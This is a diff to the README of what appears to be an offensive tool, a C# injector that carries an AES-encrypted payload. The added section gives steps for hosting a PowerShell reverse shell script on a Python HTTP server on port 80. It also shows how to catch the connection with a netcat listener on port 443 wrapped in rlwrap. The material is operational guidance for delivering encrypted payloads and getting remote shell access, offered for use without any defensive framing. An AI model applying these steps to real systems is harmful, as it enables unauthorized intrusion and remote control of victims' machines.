@@ -93,8 +93,30 @@ Use the provided AES Python script:
 bash
 python3 Aes_encryption.py
 
-
 This will output the AES-encrypted payload and corresponding key/IV in C# format. Copy the output and paste it into the injector.
+
+
+### 5. Setup http server and listener
+
+## 🖥️ Hosting the Reverse Shell Payload
+
+The PowerShell reverse shell should be saved as `shell.ps1`.
+
+Then serve the file using Python’s built-in HTTP server:
+
+```bash
+python3 -m http.server 80
+```
+
+---
+
+## 📡 Setting Up the Listener
+
+To catch the reverse shell, start a listener using `netcat` and `rlwrap` for a better terminal experience:
+
+```bash
+rlwrap -cAr nc -lnvp 443
+```
 
 ---
 
